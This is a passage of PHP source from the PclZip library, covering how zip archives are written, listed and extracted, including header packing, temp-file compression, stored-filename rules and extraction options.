    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

